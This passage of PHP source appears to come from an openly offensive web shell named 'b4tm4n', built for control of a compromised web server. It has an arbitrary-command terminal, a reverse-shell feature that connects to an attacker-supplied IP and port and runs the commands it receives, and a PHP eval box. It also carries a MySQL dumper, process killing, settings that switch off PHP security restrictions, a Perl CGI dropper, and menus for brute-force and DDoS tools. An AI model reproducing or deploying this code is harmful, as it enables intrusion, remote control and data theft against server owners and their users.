			</table>",$total,round($risk,2),round($secure,2),$table);
	}
	if($_REQUEST['x']=="info")
	{
		printf("<div id='php-configuration'>
			<form onsubmit='return false;' class='new'>
				<select id='php-config'>
					<option value='4'>INFO_CONFIGURATION</option>
					<option value='16' selected>INFO_ENVIRONMENT</option>
					<option value='32'>INFO_VARIABLES</option>
					<option value='8'>INFO_MODULES</option>
					<option value='1'>INFO_GENERAL</option>
					<option value='2'>INFO_CREDITS</option>
					<option value='64'>INFO_LICENSE</option>
					<option value='-1'>INFO_ALL</option>
				</select>
				<input type='submit' onclick=\"return getAjax(true,'php-info','POST','?x=info&xa=envirolment&config='+document.getElementById('php-config').value);\"/><br>
			</form>
		</div>
		<div id='php-info' class='result'></div>");

		$cores=['PHP_VERSION','PHP_MAJOR_VERSION','PHP_MINOR_VERSION','PHP_RELEASE_VERSION','PHP_VERSION_ID',
				  'PHP_EXTRA_VERSION','PHP_ZTS','PHP_DEBUG','PHP_MAXPATHLEN','PHP_OS','PHP_OS_FAMILY','PHP_SAPI',
				  'PHP_EOL','PHP_INT_MAX','PHP_INT_MIN','PHP_INT_SIZE','PHP_FLOAT_DIG','PHP_FLOAT_EPSILON',
				  'PHP_FLOAT_MIN','PHP_FLOAT_MAX','DEFAULT_INCLUDE_PATH','PEAR_INSTALL_DIR','PEAR_EXTENSION_DIR',
				  'PHP_EXTENSION_DIR','PHP_PREFIX','PHP_BINDIR','PHP_BINARY','PHP_MANDIR','PHP_LIBDIR','PHP_DATADIR',
				  'PHP_SYSCONFDIR','PHP_LOCALSTATEDIR','PHP_CONFIG_FILE_PATH','PHP_CONFIG_FILE_SCAN_DIR',
				  'PHP_SHLIB_SUFFIX','PHP_FD_SETSIZE'];

		$table="";
		foreach($cores as $core)
		{
			$table.="<tr><td>".$core."</td><td>".@constant($core)."</td></tr>";
		}

		printf("<h2>Core Predefined Constants</h2><br>
				<table class='table'>
					<thead>
						<tr>
							<th>Predefined Constants</th>
							<th>Value</th>
						</tr>
					<tbody>%s</tbody>
				</table>",$table);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="envirolment")
		{
			ob_clean();
			phpinfo($_REQUEST['config']);
			$phpinfo=ob_get_contents();
			ob_end_clean();
			$phpinfo=preg_replace('%^.*<body>(.*)</body>.*$%ms','$1',$phpinfo);
			printf("<div id='phpinfo'>%s</div>",$phpinfo);
			exit;
		}
	}
	if($_REQUEST['x']=="db")
	{
		if(isset($_SESSION['connect'])&&$_SESSION['connect']=='true')
		{
			printf("<div class='database-session'>
					<div class='database-query'>
						<form action='?x=db&q=db' method='post'>
							<label>MYSQL Query<hr></label><br>
							<label><i style='color:#222'>
								show databases;<br>
								show tables from {database};<br>
								show columns from {database}.{table};<br>
								select * from {database}.{table};</i></label>
							<textarea id='query' name='query'>%s</textarea><br>
							<input type='submit' name='disconnect' value='Disconnect'/>
							<input type='submit' value='Execute'/>
						</form>
					</div>",(isset($_SESSION['query'])?$_SESSION['query']:''),gethostbyname(http_host));

			$process="";
			$sql=mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
			$result=mysql_list_processes($sql);
			while ($row=mysql_fetch_assoc($result))
			{
			    $process.=sprintf("<tr>
			    	<td>%s</td>
			    	<td>%s</td>
			    	<td>%s</td>
			    	<td>%s</td>
			    	<td>%s</td></tr>",$row["Id"],$row["Host"],$row["db"],$row["Command"],$row["Time"]);
			}
			mysql_free_result($result);
			
			printf("<div class='database-process'>
					<div id='mysql-process-result'>
						<label>Database Process<hr></label>
						<table class='table table-bordered'>
							<thead>
								<tr>
									<th>Id</th>
									<th>Host</th>
									<th>Database</th>
									<th>Command</th>
									<th>Time</th>
								</tr>
							</thead>
							<tbody>%s</tbody>
						</table>
					</div>
			",$process);

			printf("<div id='database-dump'>
					<label>Database Dump<hr></label>
					<form action='?x=db&xa=dmp' method='post'><br>
						<label>Database</label><input type='text' name='database' value=''/><br>
						<label>Output</label><input type='text' name='output' value='%s'/><br>
						<input type='submit' value='Dump' />
						<label>%s</label>
					</form>
				</div></div></div><div class='clr'></div>",$dir,@$_SESSION['status']);
		}
		else
		{
			printf("<div id='database'>
					<form action='?x=db&xa=db' method='post' class='new'><br>
						<label>Host</label><input type='text' name='host' value='%s'/><br>
						<label>Port</label><input type='text' name='port' value='3306'/><br>
						<label>Username</label><input type='text' name='user' value='root'/><br>
						<label>Password</label><input type='text' name='pass' value=''/><br>
						<input type='submit' value='Connect'/>
					</form>
				</div>",gethostbyname(http_host));
		}

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="db")
		{	
			$cn=@mysqli_connect($_REQUEST['host'],$_REQUEST['user'],$_REQUEST['pass'],null,$_REQUEST['port']);

			$_SESSION['host']=$_REQUEST['host'];
			$_SESSION['port']=$_REQUEST['port'];
			$_SESSION['user']=$_REQUEST['user'];
			$_SESSION['pass']=$_REQUEST['pass'];

			if($cn)
			{
				$_SESSION['connect']='true';
				header('location:'.php_self.'?x=db');
			}
			else
			{
				printf("<b class='off'>Connection Failed</b>");
				$_SESSION['connect']='false';
			}
		}

		if(any("q",$_REQUEST)&&$_REQUEST['q']=="db")
		{
			$_SESSION['status']='';
			$sql=@mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);

			if(isset($_REQUEST['disconnect']))
			{
				mysqli_close($sql);
				unset($_SESSION['connect']);
				unset($_SESSION['query']);
				unset($_SESSION['host']);
				unset($_SESSION['user']);
				unset($_SESSION['pass']);
				header('location:'.php_self.'?x=db');
			}

			$data=[];
			$query=!empty($_REQUEST['query'])?$_REQUEST['query']:'show databases;';
			$result=@mysqli_query($sql,$query);
			$_SESSION['query']=$_REQUEST['query'];
			
			if($result)
			{
				while($row=@mysqli_fetch_row($result))
				{
					$data[]=$row;
				}
			}
			else
			{
				$data=false;
			}

			if ($data!==false)
			{
				echo "<table class='table'>";
				foreach($data as $key => $val)
				{
					if(is_array($val))
					{
						echo "<tr>";
						foreach($val as $key2 => $val2)
						{
							if(!is_array($val2))
							{
								echo "<td>".$val2."</td>";
							}
						}
						echo "</tr>";
					}
					
				}
				echo "</table>";
			}
			else
			{
				echo '<span class=off>Query not Executed</span>';
			}
		}

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="dmp")
		{
	    	$database=$_REQUEST['database'];
	    	$output=$_REQUEST['output'];

			if (!file_exists($output)&&!empty($database)) 
			{
			    $link=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],null,$_SESSION['port']);
			    mysqli_set_charset($link,'utf8');
			    mysqli_select_db($link,$database);
			    $tables=array();
			    $result=mysqli_query($link,'SHOW TABLES');
			    while($row=mysqli_fetch_row($result))
				{
					$tables[]=$row[0];
				}
			    $return='SET FOREIGN_KEY_CHECKS=0;' . "\r\n";
			    $return.='SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";' . "\r\n";
			    $return.='SET AUTOCOMMIT=0;' . "\r\n";
			    $return.='START TRANSACTION;' . "\r\n";
			    foreach($tables as $table)
			    {
			        $result=mysqli_query($link,'SELECT * FROM '.$table);
			        $num_fields=mysqli_num_fields($result);
			        $num_rows=mysqli_num_rows($result);
			        $i_row=0;
			        $row2=mysqli_fetch_row(mysqli_query($link,'SHOW CREATE TABLE '.$table));
			        $return.="\n\n".$row2[1].";\n\n";
			        if ($num_rows!==0) {
			            $row3=@mysqli_fetch_fields($result);
			            $return.='INSERT INTO '.$table.'( ';
			            foreach ($row3 as $th) 
			            { 
			                $return.='`'.$th->name.'`,';
			           }
			            $return=substr($return,0,-2);
			            $return.=' ) VALUES';
			            for ($i=0;$i < $num_fields;$i++) 
			            {
			                while($row=mysqli_fetch_row($result))
			                {
			                    $return.="\n(";
			                    for($j=0;$j<$num_fields;$j++) 
			                    {
			                        $row[$j]=addslashes($row[$j]);
			                        $row[$j]=preg_replace("#\n#","\\n",$row[$j]);
			                        if (isset($row[$j])) { $return.='"'.$row[$j].'"' ;} else { $return.='""';}
			                        if ($j<($num_fields-1)) { $return.=',';}
			                   }
			                    if (++$i_row==$num_rows) {
			                        $return.=");";
			                   } else {
			                        $return.="),";
			                   }   
			               }
			           }
			       }
			        $return.="\n\n\n";
			   }
			    $return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
			    $return.='COMMIT;';
			    $output=end(explode(".",$output))=='sql'?$output:$output.'.sql';
			    $handle=fopen($output,'w+');
			    fwrite($handle,$return);
			    fclose($handle);
				$_SESSION['status']=sprintf("Dump with success... <a href='?a=v&r=%s'>'%s'</a>",urle($output),basename($output));	    
			}

			header('location:'.php_self.'?x=db');
		}
	}
	if($_REQUEST['x']=="terminal")
	{
		$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();

		printf("
			<div id='terminal'>
				<textarea id='prompt-terminal' class='cmd' cols='122' rows='20' readonly>%s</textarea>
				<form onsubmit='return false;'>
					<label id='curdir-terminal'>$ %s:</label>
					<input type='text' id='terminal-input' autocomplete='off' onfocus=\"\" onkeydown=\"
						if(event.keyCode==13) 
						{
							temp=this.value;
							this.value='';
							getAjax(true,'curdir-terminal','POST','?x=terminal&xa=terminals-curdir&cmd='+temp);
							return getAjax(false,'prompt-terminal','POST','?x=terminal&xa=terminals&cmd='+temp);
						}
					\" class='cmd' name=cmd cols=122 rows=2></input>
				</form>
			</div>",Execute('whoami'),$dir);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals")
		{	
			ob_clean();
			$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
			@chdir($dir);
			$charset='UTF-8';
			if(!Unix())
			{
				$charset='Windows-1251';
			}
			$ret=iconv($charset,'UTF-8',Execute($command));
			echo html_entity_decode($ret);
			exit;
		}
		elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir")
		{	
			ob_clean();
			$dir=any("curdir",$_SESSION)?$_SESSION['curdir']:getcwd();
			$command=!empty($_REQUEST['cmd'])?$_REQUEST['cmd']:"whoami";
			if (preg_match('/cd (.*)/',$command,$dirx))
			{
				if ($dirx[1]=='..')
				{
					$dir=substr($dir,0,strrpos($dir,_));
					if (strlen($dir)<=2) $dir=$dir._;
				}
				else
				{
					if (is_dir($dirx[1]))
					{
						$dir=$dirx[1];
					}
				}
			}
			$_SESSION['curdir']=$dir;
			echo '$ '.$dir.':';
			exit;
		}
	}
	if($_REQUEST['x']=="connect")
	{
		printf("<div id='connect'>
				<div class='connect-left'>
					<div class='Reverse-connect'>
						<fieldset>
							<legend>Reverse Connect</legend>
							<form action='?x=connect&xa=reverse-connect' method='post' onsubmit=\"
								return confirm('HOST will FUCKED ON ur PC or LAPTOP ?!\\nMake Sure ur FIREWALL OFF ?!\\nUSE NETCAT {nc -lvp ' + document.getElementById('reverse-port').value+'}\\n\\nTYPE \'exit\' or \'quit\' to TERMINATE')\">
								<label>Remote Ip</label><input type='text' name='reverse-ip' value='%s'/><br>
								<label>Remote Port</label><input type='text' id='reverse-port' name='reverse-port' value='1337'/><br>
								<label>Socket</label><select name='socket'>
									<option value='fsockopen'>fsockopen</option>
									<option value='socket_create'>socket_create</option>
									<option value='stream_socket_client'>stream_socket_client</option>
								</select><br>
								<input type='submit' value='Connect'  />
							</form>
						</fieldset>
					</div>
				</div>
				<div class='connect-right'>
					<div class='status-connect'>
						<fieldset>
 							<legend>Status</legend>
							<div id='connect-result'>Terminal: %s",
							remote_addr,Execute('whoami') 
		);

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="reverse-connect")
		{
			if($_REQUEST['socket']=="fsockopen")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=@fsockopen($host,$port,$errno,$errstr);
				if($errno!=0)
				{
					printf("<font color='red'><b>%s</b>:%s</font>",$errno,$errstr);
				}
				else
				{
					while(!feof($sock)) 
				    {
				    	fwrite($sock,"[b4tm4n]:");
				        $command=fgets($sock,1024);
				        if(trim($command)=='quit'||trim($command)=='exit')
					    {
					    	fclose($sock);
					    	printf($command);
					    	exit;
					   }
				        fwrite($sock,Execute($command));
				   }
				    fclose($sock);
				}
			}
			else if($_REQUEST['socket']=="socket_create")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
				socket_set_nonblock($sock);
				if(!$sock)
				{
					printf("<font color='red'>Connection Error</font>");
				}
				else
				{
					while(!@socket_connect($sock,$host,$port)) 
					{
					    @socket_write($sock,"[b4tm4n]:",strlen ("[b4tm4n]:"));
					    $input=@socket_read($sock,1024,PHP_NORMAL_READ);
					    if (trim($input)=='quit'||trim($input)=='exit')
					    {
					    	socket_set_block($sock);
					    	socket_close($sock);
					    	printf($input);
					    	exit;
					   }
					    @socket_write($sock,Execute($input),strlen (Execute($input)));
					}
					socket_set_block($sock);
					socket_close($sock);
				}
			}
			else if($_REQUEST['socket']=="stream_socket_client")
			{
				$host=$_REQUEST['reverse-ip'];
				$port=$_REQUEST['reverse-port'];
				$sock=@stream_socket_client("tcp://$host:$port",$errno,$errstr);
				if (!$sock) 
				{ 
				    printf("<font color='red'><b>%s</b>:%s</font>",$errno,$errstr);
				} 
				else 
				{ 
					while(!feof($sock)) 
				    { 
				    	fwrite($sock,"[b4tm4n]:");
				        $command=fgets($sock,1024);
				        if(trim($command)=='quit'||trim($command)=='exit')
					    {
					    	fclose($sock);
					    	printf($command);
					    	exit;
					   }
				        fwrite($sock,Execute($command));
				   } 
				    fclose($sock);
				} 
			}
		}
		printf("</fieldset></div></div></div></div>");
	}
	if($_REQUEST['x']=="htaccess")
	{
		$php_ini="upload_max_filesize=40M\npost_max_size=40M\nsafe_mode=Off\ndisable_functions =\nsafe_mode_gid=Off\nopen_basedir=Off\nregister_globals=on\nexec=On\nshell_exec=On";
		$htaccess="Options All\nAllow from all\nSatisfy Any";

		print "Coming Soon";
	}
	if($_REQUEST['x']=="php")
	{	
		$evil="";
		printf("<div id='php'>
					<form onsubmit='return false;'>
						<div class='php-left'>
							<textarea id='php-code' cols='122' rows='20'>
							print_r(get_extension_funcs('Core'));
							print_r(get_loaded_extensions());
							print_r(ini_get_all('pcre'));
							print_r(ini_get_all());
							print_r(get_defined_constants());
							print_r(get_defined_functions());
							print_r(get_declared_classes());
							</textarea>
						</div>
						<div class='php-right'>
							<textarea id='php-eval' cols='122' rows='20' readonly>%s</textarea>
						</div>
						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value=Run />
					</form>
				</div>",$evil);

		if(any("code",$_REQUEST))
		{
			ob_clean();
			$evil=Evil($_REQUEST['code']);
			exit;
		}
	}
	if($_REQUEST['x']=="perl")
	{
		echo 'PHP Perl Class: '.(class_exists('Perl')?"<b class='on'>ON</b>":"<b class='off'>OFF</b>").'<br>';

		if(Unix())
		{
			if(file_exists("/usr/bin/perl"))
			{
				$path_perl="/usr/bin/perl";
			}
			else
			{
				$path_perl="/usr/bin/env";
			}
		}
		else
		{
			if(file_exists("C:\\perl\bin\perl.exe"))
			{
				$path_perl="C:\\perl\bin\perl.exe";
			}
			elseif(file_exists("C:\\wamp\bin\perl.exe"))
			{
				$path_perl="C:\\wamp\bin\perl.exe";
			}
			elseif(file_exists("C:\\xampp\perl\bin\perl.exe"))
			{
				$path_perl="C:\\xampp\perl\bin\perl.exe";
			}
		}
		
		$script="#!$path_perl\nuse strict;\nuse warnings;\nuse CGI;\nprint CGI::header();\nprint \"k4mpr3t on CGI\";";
		$htaccess="Options +ExecCGI\nAddType application/x-httpd-cgi .ler\nAddHandler cgi-script .ler";
		$path=$dir._.'cgi-bin';
		$file=$path._.'index.ler';
		$file2=$path._.'.htaccess';

		if(!is_dir($path))
		{
			mkdir($path,0755);
		}
		if(!is_file($file))
		{
			$op=fopen($file,'wb+');
			fputs($op,$script);
			fclose($op);
			chmod($file,0755);
		}
		if(!is_file($file2))
		{
			$op=fopen($file2,'wb+');
			fputs($op,$htaccess);
			fclose($op);
			chmod($file2,0755);
		}

		$redirect=GetUrlFromPath($file);
		printf("Tested -> <a href='$redirect' target='_blank'><u>Link</u></a>");
		
		if (class_exists('Perl'))
		{
			//$perl=Perl::getInstance();
			$perl=new Perl();
			$perl->eval("print \"Executing Perl code in PHP\n\"");
			print "Hello from PHP! ";

			//$perl=new Perl();
			$perl->require($file);
			$val=$perl->somePhpFunc('test');
			print $val;
		}
	}
	if($_REQUEST['x']=="mail")
	{

		$to='johny@example.com,sally@example.com';
		$subject='Birthday Reminders for August';

		$message='
		<html>
		<head>
		  <title>Birthday Reminders for August</title>
		</head>
		<body>
		  <p>Here are the birthdays upcoming in August!</p>
		  <table>
		    <tr>
		      <th>Person</th><th>Day</th><th>Month</th><th>Year</th>
		    </tr>
		    <tr>
		      <td>Johny</td><td>10th</td><td>August</td><td>1970</td>
		    </tr>
		    <tr>
		      <td>Sally</td><td>17th</td><td>August</td><td>1973</td>
		    </tr>
		  </table>
		</body>
		</html>
		';

		$headers[]='MIME-Version:1.0';
		$headers[]='Content-type:text/html;charset=iso-8859-1';
		$headers[]='To:Mary <mary@example.com>,Kelly <kelly@example.com>';
		$headers[]='From:Birthday Reminder <birthday@example.com>';
		$headers[]='Cc:birthdayarchive@example.com';
		$headers[]='Bcc:birthdaycheck@example.com';

		$send_mail=mail($to,$subject,$message,implode("\r\n",$headers));
		var_dump($send_mail);
	}
	if($_REQUEST['x']=='process')
	{
		printf("<div id='process-kill'><form class='new' method='post' action='?x=process&xa=kill'>
					<label>PID</label> <input type='text' name='pid'/>
					<input type='submit' value='Kill'/><br>
					<label>Name</label> <input type='text' name='name'/>
					<input type='submit' value='Kill'/>
				</form></div>");

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="kill")
		{
			$pid=$_REQUEST['pid'];
			$name=$_REQUEST['name'];

			if(Unix())
			{
				$kill=Execute("kill 9 $pid");
				$kill=Execute("kill 9 $name");
				if($kill) echo '<font class="off">Process Killed</font>';
			}
			else
			{
				$kill=Execute("taskkill /f /pid $pid");
				$kill=Execute("taskkill /f /im $name");
				if($kill) echo '<font class="off">Process Killed</font>';
			}
		}

		if(Unix())
		{
			$ret=iconv('UTF-8','UTF-8',Execute('ps aux | less'));
			echo '<div id="process-list"><pre>'.html_entity_decode($ret).'</pre></div>';
		}
		else
		{
			$ret=iconv('Windows-1251','UTF-8',Execute('tasklist'));
			echo '<div id="process-list"><pre>'.html_entity_decode($ret).'</pre></div>';
		}
	}
	if($_REQUEST['x']=='shells')
	{
		print "Coming Soon";
	}
	if($_REQUEST['x']=='symlink')
	{
		print "Coming Soon";
	}
	if($_REQUEST['x']=="account")
	{
		printf("<div id='account'><form class='new' method='post' action='?x=account&xa=change'>
					<label>Username</label> <input type='text' name='change-username' autocomplete='off' value='%s'/> <br>
					<label>Password</label> <input type='text' name='change-password' autocomplete='off'value=''/><br>
					<input type='submit' value='Change' onclick=\"return confirm('Sure ?');\"/>
				</form></div>",B64D($config['user']));

		if(any("xa",$_REQUEST)&&$_REQUEST['xa']=="change")
		{
			$filename=script_filename;
			$username=$_REQUEST['change-password'];
			$password=$_REQUEST['change-username'];

			if (!empty($username)&&!empty($password))
			{
				$pass_from=$config['pass'];
				$pass_to=sha1(md5($username));
				$content=file_get_contents($filename);
				$chunk=explode($pass_from,$content);
				$content=implode($pass_to,$chunk);
				$change=file_put_contents($filename,$content);

				$user_from=$config['user'];
				$user_to=B64E($password);
				$content=file_get_contents($filename);
				$chunk=explode($user_from,$content);
				$content=implode($user_to,$chunk);
				$change=file_put_contents($filename,$content);

				if($change)
				{
					session_destroy();
					session_regenerate_id();
					header('location:'.php_self);
				}
				else
				{
					printf("Error change account");
				}
			}
			else
			{
				printf("<b class='off'>Mistakes !</b>");
			}
		}
	}
	if($_REQUEST['x']=="action")
	{
		$files=any('chk',$_REQUEST)?$_REQUEST['chk']:[];
		$value=any('action-value',$_REQUEST)?$_REQUEST['action-value']:$_REQUEST['action-option'];
		$tmp="";
		$row="";
		$count_dirs=0;
		$count_files=0;
		
		foreach($files as $file)
		{
			if(is_dir(urld($file)))
			{
				$count_dirs++;
			}
			if(is_file(urld($file)))
			{
				$count_files++;
			}

			$row.="<tr><td>".urld($file)."</td></tr>";
			$tmp.=urld($file).",";
		}

		if(!any('xa',$_REQUEST)&&$value=='delete')
		{
			printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<input type='hidden' name='action-option' value='%s'/>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='submit' value='Remove'/>
					</form>",
					$count_dirs,
					$count_files,
					$row,
					$value,
					$tmp);
		}

		if(!any('xa',$_REQUEST)&&$value!='delete')
		{
			printf("<h4>Dir's: [%s] File's: [%s]</h4>
					<table class='table'>%s</table>
					<form class='new' method='post' action='?x=action&xa=option'>
						<script>window.onload=function(e){document.getElementById('action_option').value='%s'}</script>
						<select name='action-option' id='action_option'>
							<option value='copy'>Copy</option>
							<option value='move'>Move</option>
							<option value='zip'>Archive (zip)</option>
							<option value='unzip'>Extract to (zip)</option>
						</select>
						<i>-></i>
						<input type='hidden' name='tmp' value='%s'/>
						<input type='text' name='newloc' value='%s'/>
						<input type='submit' value='Process'/>
					</form>",
					$count_dirs,
					$count_files,
					$row,
					$value,
					$tmp,
					$dir._);
		}

		if(any('xa',$_REQUEST)&&$_REQUEST['xa']=='option')
		{
			$files=array_filter(explode(',',$_REQUEST['tmp']));
			$newloc=trim(@$_REQUEST['newloc']);
			$succ=0;
			$fail=0;

			if($_REQUEST['action-option']=='copy')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(CopyRecursive($file,rtrim($newloc,_)._.basename($file)))
						{
							$succ++;
						}
						else
						{
							$fail++;
						}
					}
					echo "Success: $succ | Failed: $fail";
				}
				else
				{
					echo "Target not exists !";
				}
			}

			if($_REQUEST['action-option']=='move')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(MoveRecursive($file,rtrim($newloc,_)._.basename($file)))
						{
							$succ++;
						}
						else
						{
							$fail++;
						}
					}
					echo "Success: $succ | Failed: $fail";
				}
				else
				{
					echo "Target not exists !";
				}
			}

			if($_REQUEST['action-option']=='delete')
			{
				foreach($files as $file)
				{
					if(Remove($file))
					{
						$succ++;
					}
					else
					{
						$fail++;
					}
				}
				echo "Success: $succ | Failed: $fail";
			}

			if($_REQUEST['action-option']=='zip')
			{
				if(end(explode(".",$newloc))=='zip')
				{
					$zip = new ZipArchive;

					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE) === TRUE) 
					{
						foreach($files as $file)
						{
							if(is_dir($file))
							{
								$zip->addEmptyDir(basename($file));

								$recur = new RecursiveIteratorIterator(
								    new RecursiveDirectoryIterator($file),
								    RecursiveIteratorIterator::LEAVES_ONLY 
								);

								foreach ($recur as $key => $val) 
								{
								    if(basename($key)!="..")
									{
									    if(is_dir($key))
										{
											$zdir=str_replace($file,basename($file),realpath($key));
											$zip->addEmptyDir($zdir);
										}
										elseif(is_file($key))
										{
											$zfile=str_replace($file,basename($file),realpath($key));
											$zip->addFile(realpath($key),$zfile);
										}
									}
								}
							}
							elseif(is_file($file))
							{
								$zip->addFile($file, basename($file));
							}
						}

					    $zip->close();
					    echo 'Zip Created';
					} 
					else 
					{
					    echo 'Failed';
					}
				}
				else
				{
					echo 'Extension must Zip';
				}
			}

			if($_REQUEST['action-option']=='unzip')
			{
				if(file_exists($newloc)&&is_dir($newloc))
				{
					foreach($files as $file)
					{
						if(end(explode(".",$file))=='zip')
						{
							$zip = new ZipArchive;
					
							if ($zip->open($file) === TRUE) 
							{
							    $zip->extractTo($newloc);
							    $zip->close();
							    $succ++;
							} 
							else 
							{
							    $fail++;
							}
						}
						else 
						{
						    $fail++;
						}
						
					}
					echo "Success: $succ | Failed: $fail";
				}
				else
				{
					echo "Target not exists !";
				}
			}
		}
	}
	if($_REQUEST['x']=="find")
	{
		$recur = new RecursiveIteratorIterator(
		    new RecursiveDirectoryIterator($dir),
		    RecursiveIteratorIterator::LEAVES_ONLY 
		);

		if(any('find-value',$_REQUEST)&&!empty($_REQUEST['find-value']))
		{
			$result="";
			$res_=0;
			$no=1;

			foreach ($recur as $key => $val) 
			{
				if(basename($key)!="..")
				{
					if(strpos(realpath($key),$_REQUEST['find-value'])!== false) 
					{
						$result.=sprintf("<tr>
								<td><center>%d</center></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
								<td><center>%s</center></td>
								</tr>",
								$no++,
								substr(realpath($key),0,strrpos(realpath($key),_)),
								substr(realpath($key),0,strrpos(realpath($key),_)),
								substr(realpath($key),0,strrpos(realpath($key),_)),
								realpath($key),
								realpath($key),
								basename(realpath($key)),
								GetFileTime(realpath($key),'modify')
						);

						$res_++;
					}
				}
			}

			printf("<label>Find: '%s' | Found's: %s</label>
					<table class='table sortable'>
						<thead>
							<tr>
								<th>No.</th>
								<th>Directory</th>
								<th>Filename</th>
								<th>Modified</th>
							</tr>
						<tbody>%s</tbody>
					</table>",$_REQUEST['find-value'],$res_,$result);

		}
		else
		{
			echo 'Whoops, Nothing Find !';
		}
	}
	if($_REQUEST['x']=="update")
	{
		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
		$current_version=2.1; //Sensitive Case Variable

		if($config['debug']==true)
		{
			$git_script=htmlentities(file_get_contents(__FILE__));
			$latest_version=$current_version-0.1; //Test Update latest version -/+ 0.1
		}
		else
		{
			$git_script=GetUrlContent($link_update);
			$get_version=strpos($git_script,"current_version");
			$latest_version=substr($git_script,$get_version+16,3);
		}

		$status="";
		if((float)$latest_version>(float)$current_version)
		{
			if($config['debug']==true)
			{
				$status.='New Version Available<br>Setting Debug to False for Activate this Feature';
			}
			else
			{
				$status.='New Version Available '.$latest_version.'<br>Download -> [<font class="on"><a href="'.$link_update.'" target="_blank">link</a></font>]';
			}
		}
		else
		{
			$status.='Latest Version '.$config['version'];
		}

		Printf("<div id='update'>
					<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank'>
						<img src='https://www.gnu.org/graphics/lgplv3-88x31.png'/>
					</a><br><br>%s
				</div>",$status);
	}
}

/* START CUSTOM TOOLZ */
if(any("z",$_REQUEST))
{
	$z=$_REQUEST['z'];

	echo MenuTools([
		"target-map"=>["title"=>"Target Map","ver"=>"1.0","auth"=>"k4mpr3t"],
		"port-scanner"=>["title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"],
		"script-loader"=>["title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"],
		"encryptor"=>["title"=>"Encryptor","ver"=>"1.0","auth"=>"k4mpr3t"],
		"frmail-bruteforces"=>["title"=>"Form Email Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
		"login-bruteforces"=>["title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
		"mass-tools"=>["title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"],
		"ddos-attack"=>["title"=>"DDOS Attack","ver"=>"1.0","auth"=>"k4mpr3t"],
	]);

	echo "<div id='tools'>";

	if(empty($z))
	{
		printf("<div id='thanks'>
					<h2>Nothing Is Secure...</h2>
					<h3>WHY SO serious ?!</h3>
				</div>");
	}
	if($z=="target-map")
	{
		echo "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='target-map'>
			<form onsubmit='return false;' class='new'>
				<input type='text' id='map-ip' value='%s'/>
				<input type='submit' value='Trace' onclick=\"return getAjax(true,'target-info','POST','?z=target-map&ip='+document.getElementById('map-ip').value);\"/><br>
			</form>
		</div>
		<div id='target-info' class='result'></div>",gethostbyname(http_host));

		if(any("ip",$_REQUEST))
		{
			ob_clean();
			$ip=!empty($_REQUEST['ip']) ? $_REQUEST['ip'] : gethostbyname(http_host);
			$valid=filter_var($ip,FILTER_VALIDATE_IP) or die('Invalid IP Address');
			if($_REQUEST['ip']==gethostbyname(http_host)) 
			{
				$url=B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==");
				$geoip=GetUrlContent($url);
				$json=json_decode($geoip,true);
				$ip=$json['query'];
			}
			$url=sprintf(B64D("zSI9xWleO7AbADEmAD0kxX4fACJezmMeyt==")."/%s",$ip);
			$geoip=GetUrlContent($url);
			$json=json_decode($geoip,true);
			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
					$json['country_name'],
					$json['country_code'],
					$json['city'],
					$json['region_name'],
					$url);
			exit;
		}
	}
	if($z=="port-scanner")
	{
		echo "<div class='tools-header'>
				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
			  </div>";

		printf("<div id='port-scan'>
					<form onsubmit='return false;' class='new'>
						<label>Host Port</label><input type='text' id='ip-port' value='%s'/><br>
						<label>Start Port</label><input type='text' id='start-port' value='1'/><br>
						<label>End Port</label><input type='text' id='end-port' value='65535'/><br>
